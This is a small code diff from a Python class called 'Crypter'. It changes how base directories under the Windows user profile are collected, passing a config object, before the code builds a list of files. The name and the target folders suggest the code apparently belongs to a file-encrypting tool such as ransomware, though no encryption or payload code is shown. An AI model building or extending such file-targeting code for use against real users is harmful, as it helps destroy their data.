@@ -220,7 +220,7 @@ class Crypter(Base.Base):
     '''
     binary_name = os.path.split(sys.argv[0])[1]
 
-    base_dirs = self.get_base_dirs(os.environ['USERPROFILE'])
+    base_dirs = self.get_base_dirs(os.environ['USERPROFILE'], self.__config)
     file_list = []
 
     for directory in base_dirs:
